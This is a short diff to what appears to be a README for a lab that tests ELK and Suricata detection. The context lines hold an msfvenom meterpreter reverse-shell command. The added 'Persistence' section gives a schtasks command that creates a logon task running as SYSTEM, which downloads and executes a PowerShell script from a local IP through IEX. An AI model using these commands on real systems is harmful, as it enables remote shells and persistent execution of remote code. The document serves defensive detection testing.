@@ -114,3 +114,17 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f 
 **Suricata alerts**
 ![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/MetasploitLogs.png)
 
+## Persistence
+
+Implement persistence through Scheduled Task Persistence technique.
+
+Using this command to schedule task. When you logon your computer, powershell.exe and script will be executed.
+
+```text
+schtasks /create /tn "TestUpdateTask" 
+/tr "powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://192.168.85.129:8000/test.ps1'')'" 
+/sc onlogon /ru System /f
+```
+
+
+
